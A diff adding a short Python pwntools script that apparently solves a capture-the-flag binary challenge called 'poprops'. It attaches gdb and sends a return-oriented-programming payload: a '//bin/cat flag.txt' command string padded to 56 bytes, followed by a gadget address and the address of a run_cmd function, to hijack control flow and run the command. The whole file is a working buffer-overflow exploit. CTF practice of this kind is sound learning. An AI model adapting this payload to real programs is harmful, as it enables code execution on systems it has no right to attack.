@@ -1,0 +1,29 @@
+#!/usr/bin/env python
+
+from pwn import *
+
+r = process("./poprops")
+gdb.attach(r, '''
+	set disable-randomization off
+	b *0x400604
+	b main
+	b run_cmd
+	c
+	''')
+
+raw_input()	
+
+r.recvuntil("??\n")
+
+GADGET_ONE = 0x4005d1 # push rbp; mov rbp, rsp; pop rdi; ret
+POP_RBP = 0x4005d8
+RUN_CMD = 0x4005b6
+
+payload = ''
+payload += '//bin/cat flag.txt\x00'.ljust(56)
+payload += p64(0x4005d2) # 
+payload += p64(RUN_CMD)
+
+r.sendline(payload)
+
+r.interactive()
